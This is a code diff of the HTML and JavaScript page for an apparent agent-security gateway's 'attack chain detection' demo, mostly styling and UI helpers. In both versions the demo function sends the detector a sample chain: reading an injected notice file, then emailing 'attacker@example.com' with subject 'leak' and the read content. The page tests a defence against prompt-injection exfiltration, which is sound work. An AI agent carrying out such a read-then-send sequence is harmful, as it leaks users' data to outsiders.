@@ -1,122 +1,58 @@
-<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><title>AgentGuard 攻击链检测</title><style>
-:root{--bg:#f5f7fb;--panel:#fff;--text:#172033;--muted:#667085;--line:#dfe4ee;--primary:#245bdb;--primary-soft:#eaf0ff;--green:#11875d;--red:#c23535;--amber:#a86500;--shadow:0 12px 30px rgba(21,35,64,.08);--radius:14px}*{box-sizing:border-box}body{margin:0;font-family:Arial,"Microsoft YaHei",sans-serif;color:var(--text);background:var(--bg)}.top-nav{position:sticky;top:0;z-index:50;min-height:64px;display:flex;align-items:center;justify-content:space-between;gap:18px;padding:0 28px;background:rgba(255,255,255,.96);border-bottom:1px solid var(--line);backdrop-filter:blur(12px)}.brand{display:flex;align-items:center;gap:10px;min-width:210px;font-weight:900;white-space:nowrap}.brand-mark{width:32px;height:32px;border-radius:9px;display:grid;place-items:center;background:var(--primary);color:#fff;font-weight:900}.nav-links{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;min-width:0;overflow-x:auto}.nav-links a{position:relative;flex:0 0 auto;padding:9px 12px;border-radius:9px;color:var(--muted);text-decoration:none;font-size:14px;font-weight:800;transition:.18s ease}.nav-links a:hover{color:var(--primary);background:var(--primary-soft)}.nav-links a.active{color:#fff;background:var(--primary)}.transition-label{min-width:118px;text-align:right;color:var(--muted);font-size:12px;white-space:nowrap}.transition-dot{display:inline-block;width:8px;height:8px;margin-right:6px;border-radius:999px;background:var(--green);animation:pulse 1.8s ease infinite}.page-shell{max-width:1220px;margin:0 auto;padding:28px 28px 48px;animation:pageIn .28s ease both}body.page-leaving .page-shell{animation:pageOut .18s ease both}.hero{display:grid;grid-template-columns:minmax(0,1.55fr) minmax(280px,.85fr);gap:18px;margin-bottom:18px}.hero-main,.hero-side,.panel{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);box-shadow:var(--shadow)}.hero-main{padding:26px}.hero-side{padding:20px}.panel{padding:18px;margin-bottom:16px}.eyebrow{color:var(--primary);font-size:13px;font-weight:900;margin-bottom:8px}h1{margin:0;font-size:32px;line-height:1.25}h2{margin:0 0 14px;font-size:20px}h3{margin:0 0 10px;font-size:16px}.subtitle{margin:12px 0 0;color:var(--muted);line-height:1.7}.muted{color:var(--muted)}button,.btn{display:inline-flex;align-items:center;justify-content:center;min-height:38px;padding:9px 14px;border-radius:9px;border:1px solid transparent;background:var(--primary);color:#fff;font-weight:900;font-size:14px;text-decoration:none;cursor:pointer}button.secondary,.btn.secondary{background:#fff;color:var(--primary);border-color:#c8d4ff}.actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:16px}.status-pill,.badge{display:inline-flex;align-items:center;padding:5px 9px;border-radius:999px;font-size:12px;font-weight:900;background:#eef2f8;color:var(--muted)}.ok,.badge.allow,.badge.pass{background:#e8f7ef;color:var(--green)}.warn,.badge.confirm{background:#fff4d8;color:var(--amber)}.bad,.badge.deny,.badge.fail{background:#ffecec;color:var(--red)}.metric-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px;margin:18px 0}.metric{padding:16px;background:#fff;border:1px solid var(--line);border-radius:12px}.metric-label{color:var(--muted);font-size:13px;margin-bottom:8px}.metric-value{font-size:28px;font-weight:900}.grid-2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}.grid-3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.form-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}label{display:block;font-size:13px;font-weight:900;margin-bottom:6px}input,select,textarea{width:100%;border:1px solid var(--line);border-radius:10px;padding:10px 11px;font:inherit;background:#fff;color:var(--text)}textarea{min-height:110px;resize:vertical}.route-list{display:grid;gap:10px}.route-row{display:grid;grid-template-columns:132px minmax(0,1fr) auto;gap:12px;align-items:center;padding:12px;border:1px solid var(--line);border-radius:10px;background:#fff}.empty{padding:14px;border:1px dashed var(--line);border-radius:10px;color:var(--muted);background:#fafbff}pre{margin:0;white-space:pre-wrap;word-break:break-word;max-height:420px;overflow:auto;padding:14px;border-radius:10px;background:#101828;color:#e4e7ec;font:12px/1.55 Consolas,Monaco,monospace}.hidden-marker{display:none}@keyframes pageIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}@keyframes pageOut{from{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(8px)}}@keyframes pulse{0%,100%{opacity:.35;transform:scale(.9)}50%{opacity:1;transform:scale(1.15)}}@media(max-width:1080px){.top-nav{height:auto;align-items:flex-start;flex-direction:column;padding:12px 18px}.nav-links{width:100%;justify-content:flex-start}.hero,.grid-2,.grid-3{grid-template-columns:1fr}.metric-grid{grid-template-columns:repeat(2,minmax(0,1fr))}}@media(max-width:640px){.page-shell{padding:18px 16px 34px}.metric-grid,.form-grid{grid-template-columns:1fr}.route-row{grid-template-columns:1fr}table{display:block;overflow-x:auto}}
-
-/* AG_NAV_BACKEND_STATUS_STYLE_START */
-.nav-status{
-  min-width:190px;
-  display:flex;
-  align-items:center;
-  justify-content:flex-end;
-  gap:8px;
-  white-space:nowrap;
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>AgentGuard 攻击链检测</title>
+<style>
+:root{
+  --bg:#f4f7fb;--panel:#ffffff;--panel-soft:#f8fbff;--text:#101828;--muted:#667085;
+  --line:#d9e2ef;--primary:#245bdb;--primary-2:#1747b5;--primary-soft:#eaf0ff;
+  --green:#087443;--green-soft:#e8f7ef;--red:#b42318;--red-soft:#ffecec;
+  --amber:#a86500;--amber-soft:#fff4d8;--shadow:0 18px 45px rgba(16,24,40,.08);
 }
-.nav-status-pill{
-  display:inline-flex;
-  align-items:center;
-  justify-content:center;
-  min-height:28px;
-  padding:5px 10px;
-  border-radius:999px;
-  font-size:12px;
-  font-weight:900;
-  border:1px solid transparent;
-}
-.nav-status-pill.nav-ok{
-  color:#087443;
-  background:#e8f7ef;
-  border-color:#b7ebcf;
-}
-.nav-status-pill.nav-warn{
-  color:#a86500;
-  background:#fff4d8;
-  border-color:#ffe0a3;
-}
-.nav-status-pill.nav-bad{
-  color:#b42318;
-  background:#ffecec;
-  border-color:#ffc9c9;
-}
-.nav-check-btn{
-  min-height:30px;
-  padding:5px 10px;
-  border-radius:999px;
-  border:1px solid #c8d4ff;
-  background:#fff;
-  color:#245bdb;
-  font-size:12px;
-  font-weight:900;
-  cursor:pointer;
-}
-.nav-check-btn:hover{
-  background:#eaf0ff;
-}
-.hero{
-  grid-template-columns:1fr!important;
-}
-/* AG_NAV_BACKEND_STATUS_STYLE_END */
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;font-family:Arial,"Microsoft YaHei",sans-serif;color:var(--text);background:linear-gradient(180deg,#f7faff 0,#f4f7fb 55%,#eef3f9 100%);letter-spacing:0}
+.top-nav{position:sticky;top:0;z-index:80;height:66px;display:flex;align-items:center;gap:18px;padding:0 28px;background:rgba(255,255,255,.96);border-bottom:1px solid var(--line);backdrop-filter:blur(14px);box-shadow:0 8px 24px rgba(16,24,40,.04)}
+.brand{display:flex;align-items:center;gap:10px;min-width:210px;font-weight:900;white-space:nowrap;color:#18233f}.brand-mark{width:34px;height:34px;border-radius:10px;display:grid;place-items:center;background:var(--primary);color:#fff;box-shadow:0 8px 18px rgba(36,91,219,.28)}
+.nav-links{flex:1;display:flex;align-items:center;justify-content:center;gap:4px;min-width:0;overflow-x:auto;scrollbar-width:thin}.nav-links a{position:relative;flex:0 0 auto;padding:9px 11px;border-radius:9px;color:#5d6b82;text-decoration:none;font-size:14px;font-weight:900;transition:background .18s ease,color .18s ease,transform .18s ease}.nav-links a:hover{color:var(--primary);background:var(--primary-soft);transform:translateY(-1px)}.nav-links a.active{color:#fff;background:var(--primary)}.nav-links a.active:after{content:"";position:absolute;left:12px;right:12px;bottom:-14px;height:3px;border-radius:999px;background:var(--primary);animation:navSlide .36s ease both}
+.nav-status{min-width:190px;display:flex;align-items:center;justify-content:flex-end;gap:8px;white-space:nowrap}.nav-status-pill{display:inline-flex;align-items:center;justify-content:center;min-height:28px;padding:5px 10px;border-radius:999px;font-size:12px;font-weight:900;border:1px solid transparent}.nav-ok{color:var(--green);background:var(--green-soft);border-color:#b7ebcf}.nav-warn{color:var(--amber);background:var(--amber-soft);border-color:#ffe0a3}.nav-bad{color:var(--red);background:var(--red-soft);border-color:#ffc9c9}.nav-check-btn{min-height:30px;padding:5px 10px;border-radius:999px;border:1px solid #c8d4ff;background:#fff;color:var(--primary);font-size:12px;font-weight:900;cursor:pointer}.nav-check-btn:hover{background:var(--primary-soft)}
+.page-shell{max-width:1280px;margin:0 auto;padding:28px 28px 54px;animation:pageIn .25s ease both}.hero{display:grid;grid-template-columns:minmax(0,1fr);gap:18px;margin-bottom:18px}.hero-main,.panel{background:rgba(255,255,255,.98);border:1px solid var(--line);border-radius:18px;box-shadow:var(--shadow)}.hero-main{padding:28px}.eyebrow{color:var(--primary);font-size:13px;font-weight:900;margin-bottom:8px;letter-spacing:.02em}h1{margin:0;font-size:34px;line-height:1.22;color:#13203a}h2{margin:0 0 14px;font-size:20px;color:#13203a}h3{margin:0 0 10px;font-size:16px}.subtitle{margin:12px 0 0;color:var(--muted);line-height:1.75}.muted{color:var(--muted)}
+.panel{padding:20px;margin-bottom:16px}.panel-head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:14px}.grid-2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px}.grid-3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.metric-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:14px;margin:18px 0}.metric{padding:17px;background:var(--panel);border:1px solid var(--line);border-radius:16px;box-shadow:0 10px 28px rgba(16,24,40,.05)}.metric-label{color:var(--muted);font-size:13px;margin-bottom:8px}.metric-value{font-size:28px;font-weight:900;color:#12203b}.form-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:13px}.form-grid-3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:13px}label{display:block;font-size:13px;font-weight:900;margin-bottom:6px;color:#26344f}input,select,textarea{width:100%;border:1px solid var(--line);border-radius:12px;padding:11px 12px;font:inherit;background:#fff;color:var(--text);outline:none}textarea{min-height:110px;resize:vertical}input:focus,select:focus,textarea:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(36,91,219,.12)}button,.btn{display:inline-flex;align-items:center;justify-content:center;min-height:38px;padding:9px 15px;border-radius:12px;border:1px solid transparent;background:var(--primary);color:#fff;font-weight:900;font-size:14px;text-decoration:none;cursor:pointer;transition:transform .16s ease,background .16s ease,box-shadow .16s ease}button:hover,.btn:hover{background:var(--primary-2);transform:translateY(-1px);box-shadow:0 8px 18px rgba(36,91,219,.18)}button.secondary,.btn.secondary{background:#fff;color:var(--primary);border-color:#c8d4ff}button.secondary:hover,.btn.secondary:hover{background:var(--primary-soft)}button.danger{background:var(--red)}button.danger:hover{background:#971b12}.actions{display:flex;flex-wrap:wrap;gap:10px;margin-top:16px}.status-pill,.badge{display:inline-flex;align-items:center;padding:5px 9px;border-radius:999px;font-size:12px;font-weight:900;background:#eef2f8;color:var(--muted)}.ok,.badge.allow,.badge.pass{background:var(--green-soft);color:var(--green)}.warn,.badge.confirm{background:var(--amber-soft);color:var(--amber)}.bad,.badge.deny,.badge.fail{background:var(--red-soft);color:var(--red)}.route-list{display:grid;gap:10px}.route-row{display:grid;grid-template-columns:150px minmax(0,1fr) 140px;gap:12px;align-items:center;padding:12px;border:1px solid var(--line);border-radius:14px;background:#fff}.list-row{padding:12px;border:1px solid var(--line);border-radius:14px;background:#fff;margin-bottom:10px}.empty,.notice{padding:14px;border:1px dashed var(--line);border-radius:14px;color:var(--muted);background:#fafbff}.notice{border-style:solid;background:#fffdf5;color:#694100;line-height:1.65}table{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden}th,td{padding:12px;border-bottom:1px solid var(--line);text-align:left;vertical-align:top;font-size:14px}th{background:#eef3ff;color:#283654;font-size:13px}tr:last-child td{border-bottom:0}pre{margin:0;white-space:pre-wrap;word-break:break-word;max-height:420px;overflow:auto;padding:14px;border-radius:14px;background:#101828;color:#e4e7ec;font:12px/1.55 Consolas,Monaco,monospace}.tabs{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0 18px}.tab-btn{background:#fff;color:#526176;border-color:#d4ddeb}.tab-btn.active{background:var(--primary);color:#fff;border-color:var(--primary)}.tab-panel{display:none}.tab-panel.active{display:block}.hidden-marker{display:none!important}
+@keyframes pageIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}@keyframes navSlide{from{transform:scaleX(.25);opacity:.2}to{transform:scaleX(1);opacity:1}}
+@media(max-width:1100px){.top-nav{height:auto;min-height:66px;align-items:flex-start;flex-direction:column;padding:12px 18px}.brand,.nav-status{min-width:0}.nav-links{width:100%;justify-content:flex-start}.grid-2,.grid-3{grid-template-columns:1fr}.metric-grid{grid-template-columns:repeat(2,minmax(0,1fr))}.route-row{grid-template-columns:1fr}}@media(max-width:640px){.page-shell{padding:18px 14px 34px}.metric-grid,.form-grid,.form-grid-3{grid-template-columns:1fr}table{display:block;overflow-x:auto}}
+</style>
+</head>
+<body>
+<div class="hidden-marker">运行时攻击链检测演示 effective_decision demo-runtime-session</div>
+<nav class="top-nav"><div class="brand"><div class="brand-mark">AG</div><span>AgentGuard 安全网关</span></div><div class="nav-links"><a href="/showcase">系统总览</a><a href="/">单步授权</a><a href="/tool-proxy">工具接入</a><a href="/task-chain">任务链</a><a href="/attack-chain-runtime">攻击链检测</a><a href="/sandbox-dashboard">沙箱运行</a><a href="/authorized-evidence">授权证据</a><a href="/benchmark-dashboard">评测中心</a><a href="/security-dashboard">安全中心</a><a href="/docs">API 文档</a></div><div class="nav-status"><span id="globalBackendStatus" class="nav-status-pill nav-warn">后端检测中</span><button class="nav-check-btn" type="button" onclick="checkBackendFromNav()">检测</button></div></nav>
+<main class="page-shell">
+  <section class="hero"><div class="hero-main"><div class="eyebrow">Attack Chain Runtime</div><h1>攻击链检测</h1><p class="subtitle">基于同一会话跟踪连续工具调用，合并 Gateway 决策与攻击链上下文风险。</p></div></section>
+  
+<section class="grid-2"><div class="panel"><h2>检测控制</h2><p class="muted">默认会话：demo-runtime-session。运行结果会包含 effective_decision。</p><div class="actions"><button onclick="resetChain()">重置会话</button><button class="secondary" onclick="runAttackDemo()">运行攻击链检测</button><button class="secondary" onclick="loadChainSession()">查看会话</button></div></div><div class="panel"><h2>当前结论</h2><pre id="chainSummary">暂无数据</pre></div></section><section class="panel"><h2>步骤结果</h2><div id="steps" class="route-list"><div class="empty">点击运行攻击链检测。</div></div></section>
+</main>
+<script>
+const API_BASE = window.location.protocol === "file:" ? "http://127.0.0.1:8000" : window.location.origin;
+function normalizePath(path){ if(!path) return "/"; path=String(path).split("#")[0].split("?")[0]; if(path.length>1 && path.endsWith("/")) path=path.slice(0,-1); return path || "/"; }
+function escapeHtml(value){return String(value??"").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;").replaceAll('"',"&quot;").replaceAll("'","&#39;")}
+function pretty(data){return JSON.stringify(data,null,2)}
+function setText(id,value){const el=document.getElementById(id); if(el) el.textContent=value ?? "-";}
+function setHtml(id,value){const el=document.getElementById(id); if(el) el.innerHTML=value ?? "";}
+function setJson(id,value){const el=document.getElementById(id); if(el) el.textContent=pretty(value)}
+function badge(text,type){const t=String(type||text||"").toLowerCase();let c=""; if(t.includes("allow")||t.includes("pass")||t.includes("valid")||t.includes("ok")||t.includes("true")) c="pass"; else if(t.includes("deny")||t.includes("fail")||t.includes("invalid")||t.includes("false")) c="deny"; else if(t.includes("confirm")||t.includes("pending")||t.includes("warn")) c="confirm"; return `<span class="badge ${c}">${escapeHtml(text||"-")}</span>`}
+async function fetchText(path, options={}){ const response=await fetch(API_BASE+path, options); const text=await response.text(); if(!response.ok) throw new Error(text || `HTTP ${response.status}`); return text; }
+async function fetchJson(path, options={}){ const response=await fetch(API_BASE+path, options); const text=await response.text(); let data; try{data=text?JSON.parse(text):{}}catch(_){data={raw:text}} if(!response.ok) throw new Error(data.detail||data.message||text||`HTTP ${response.status}`); return data; }
+function jsonBody(obj){return {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(obj)}}
+function markActiveNav(){ const current=normalizePath(window.location.pathname); document.querySelectorAll(".nav-links a").forEach(link=>{ const href=normalizePath(link.getAttribute("href")||""); link.classList.toggle("active", href===current); });}
+function bindTabs(){ document.querySelectorAll("[data-tab-target]").forEach(btn=>{ btn.addEventListener("click",()=>{ const wrap=btn.closest(".panel")||document; wrap.querySelectorAll("[data-tab-target]").forEach(b=>b.classList.remove("active")); wrap.querySelectorAll(".tab-panel").forEach(p=>p.classList.remove("active")); btn.classList.add("active"); const panel=document.getElementById(btn.dataset.tabTarget); if(panel) panel.classList.add("active"); }); });}
+async function checkBackendFromNav(){ const el=document.getElementById("globalBackendStatus"); if(!el) return; el.textContent="检测中"; el.className="nav-status-pill nav-warn"; try{ await fetchJson("/api/status", {cache:"no-store"}); el.textContent="后端运行正常"; el.className="nav-status-pill nav-ok";}catch(e){ el.textContent="后端未连接"; el.className="nav-status-pill nav-bad"; }}
+document.addEventListener("DOMContentLoaded",()=>{markActiveNav();bindTabs();checkBackendFromNav(); if(typeof initPage === "function") initPage();});
 
-</style></head><body><div class="hidden-marker">运行时攻击链检测演示 effective_decision demo-runtime-session</div><nav class="top-nav"><div class="brand"><div class="brand-mark">AG</div><span>AgentGuard 安全网关</span></div><div class="nav-links"><a href="/showcase">系统总览</a><a href="/">单步授权</a><a href="/benchmark-dashboard">评测看板</a><a href="/tool-proxy">工具接入</a><a href="/attack-chain-runtime">攻击链检测</a><a href="/sandbox-dashboard">沙箱运行</a><a href="/security-dashboard">安全中心</a><a href="/authorized-evidence">授权证据</a><a href="/task-chain">任务链</a><a href="/docs">API 文档</a></div><div class="nav-status"><span id="globalBackendStatus" class="nav-status-pill nav-warn">后端检测中</span><button class="nav-check-btn" type="button" onclick="checkBackendFromNav()">检测</button></div></nav><main class="page-shell"><section class="hero"><div class="hero-main"><div class="eyebrow">Attack Chain Runtime</div><h1>攻击链检测</h1><p class="subtitle">在同一会话中连续提交工具调用，观察污染上下文如何影响后续外发风险。</p></div></section>
-<section class="grid-2"><div class="panel"><h2>检测控制</h2><p class="subtitle">默认会话：demo-runtime-session</p><div class="actions"><button onclick="resetChain()">重置会话</button><button class="secondary" onclick="runAttackDemo()">运行攻击链检测</button><button class="secondary" onclick="loadSession()">查看会话</button></div></div><div class="panel"><h2>当前结论</h2><pre id="chainSummary">暂无数据</pre></div></section><section class="panel"><h2>步骤结果</h2><div id="steps" class="route-list"><div class="empty">点击运行攻击链检测。</div></div></section>
-</main><script>
-const API_BASE=window.location.protocol==='file:'?'http://127.0.0.1:8000':window.location.origin;
-function escapeHtml(v){return String(v??'').replaceAll('&','&amp;').replaceAll('<','&lt;').replaceAll('>','&gt;').replaceAll('"','&quot;').replaceAll("'","&#39;")}
-function pretty(d){return JSON.stringify(d,null,2)}
-function badge(t,type){return `<span class="badge ${escapeHtml(type||'')}">${escapeHtml(t??'-')}</span>`}
-function pct(v){const n=Number(v);return Number.isFinite(n)?`${Math.round(n*1000)/10}%`:'-'}
-function setText(id,v){const e=document.getElementById(id);if(e)e.textContent=v??'-'}
-function setHtml(id,v){const e=document.getElementById(id);if(e)e.innerHTML=v??''}
-function setJson(id,v){const e=document.getElementById(id);if(e)e.textContent=pretty(v)}
-function setStatus(id,t,type){const e=document.getElementById(id);if(!e)return;e.textContent=t;e.className=`status-pill ${type||''}`}
-async function fetchJson(path,opt={}){const r=await fetch(`${API_BASE}${path}`,opt);const txt=await r.text();let data;try{data=txt?JSON.parse(txt):{}}catch(_){data={raw:txt}}if(!r.ok)throw new Error(data.detail||data.message||txt||`HTTP ${r.status}`);return data}
-function norm(p){p=String(p||'/').split('#')[0].split('?')[0];if(p.length>1&&p.endsWith('/'))p=p.slice(0,-1);return p||'/'}
-function markActiveNav(){const cur=norm(location.pathname);document.querySelectorAll('.nav-links a').forEach(a=>a.classList.toggle('active',norm(a.getAttribute('href'))===cur))}
-function bindPageTransitions(){document.querySelectorAll('.nav-links a[href^="/"],a.btn[href^="/"]').forEach(a=>{if(a.dataset.navBound==='1')return;a.dataset.navBound='1';a.addEventListener('click',ev=>{const href=a.getAttribute('href');if(!href||href.startsWith('/docs')||norm(href)===norm(location.pathname))return;ev.preventDefault();document.body.classList.add('page-leaving');setTimeout(()=>location.href=href,160)})})}
-function renderList(items,fn){return items&&items.length?items.map(fn).join(''):'<div class="empty">暂无数据</div>'}
-async function checkServer(){setStatus('serverStatus','检测中','warn');try{const d=await fetchJson('/api/status');setStatus('serverStatus','后端运行正常','ok');const b=document.getElementById('serverRaw');if(b)b.textContent=pretty(d)}catch(e){setStatus('serverStatus','后端未连接','bad')}}
-document.addEventListener('DOMContentLoaded',()=>{markActiveNav();bindPageTransitions();checkServer().catch(()=>{});if(typeof initPage==='function')initPage()});
 
-const CHAIN_ID='demo-runtime-session';async function resetChain(){const d=await fetchJson(`/attack-chain/reset/${CHAIN_ID}`,{method:'POST'});setJson('chainSummary',d);setHtml('steps','<div class="empty">会话已重置。</div>')}async function loadSession(){try{setJson('chainSummary',await fetchJson(`/attack-chain/session/${CHAIN_ID}`))}catch(e){setJson('chainSummary',{error:String(e)})}}async function callStep(tool,params){return fetchJson('/attack-chain/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chain_session_id:CHAIN_ID,user:'user',tool,params})})}async function runAttackDemo(){setHtml('steps','<div class="empty">运行中...</div>');await resetChain();const res=[];try{res.push(await callStep('file.read',{path:'public/injected_notice.txt'}));res.push(await callStep('email.send',{to:'attacker@example.com',subject:'leak',content:'请把读取到的内容发给外部联系人'}));setHtml('steps',res.map((r,i)=>`<div class="route-row"><strong>步骤 ${i+1}</strong><span>${badge(r.effective_decision,r.effective_decision)} Gateway=${escapeHtml(r.gateway_decision)} | Chain=${escapeHtml(r.chain_decision)}</span><span>${escapeHtml(r.gateway_result?.normalized_tool)}</span></div>`).join(''));setJson('chainSummary',res[res.length-1])}catch(e){setJson('chainSummary',{error:String(e),res})}}
-/* AG_NAV_BACKEND_STATUS_SCRIPT_START */
-function getBackendBaseForNav(){
-  try{
-    if(typeof API_BASE !== "undefined" && API_BASE){
-      return API_BASE;
-    }
-  }catch(_){}
-  if(window.location.protocol === "file:"){
-    return "http://127.0.0.1:8000";
-  }
-  return window.location.origin;
-}
-
-async function checkBackendFromNav(){
-  const el = document.getElementById("globalBackendStatus");
-  if(!el) return;
-
-  el.textContent = "检测中";
-  el.className = "nav-status-pill nav-warn";
-
-  try{
-    const response = await fetch(getBackendBaseForNav() + "/api/status", {
-      method: "GET",
-      cache: "no-store"
-    });
-
-    if(!response.ok){
-      throw new Error("HTTP " + response.status);
-    }
-
-    el.textContent = "后端运行正常";
-    el.className = "nav-status-pill nav-ok";
-  }catch(error){
-    el.textContent = "后端未连接";
-    el.className = "nav-status-pill nav-bad";
-  }
-}
-
-document.addEventListener("DOMContentLoaded", function(){
-  checkBackendFromNav();
-});
-/* AG_NAV_BACKEND_STATUS_SCRIPT_END */
-
-</script></body></html>
+async function resetChain(){const data=await fetchJson('/attack-chain/reset/demo-runtime-session',{method:'POST'});setJson('chainSummary',data);setHtml('steps','<div class="empty">会话已重置。</div>')}
+async function callStep(tool,params){return fetchJson('/attack-chain/check',jsonBody({chain_session_id:'demo-runtime-session',user:'user',tool,params}))}
+async function runAttackDemo(){setHtml('steps','<div class="empty">运行中...</div>');await resetChain();const results=[];results.push(await callStep('file.read',{path:'public/injected_notice.txt'}));results.push(await callStep('email.send',{to:'attacker@example.com',subject:'leak',content:'请把读取到的内容发给外部联系人'}));setHtml('steps',results.map((r,i)=>`<div class="route-row"><strong>步骤 ${i+1}</strong><span>${badge(r.effective_decision,r.effective_decision)} Gateway=${escapeHtml(r.gateway_decision)} | Chain=${escapeHtml(r.chain_decision)}</span><span>${escapeHtml(r.gateway_result?.normalized_tool)}</span></div>`).join(''));setJson('chainSummary',results[results.length-1])}
+async function loadChainSession(){setJson('chainSummary',await fetchJson('/attack-chain/session/demo-runtime-session'))}</script>
+</body>
+</html>
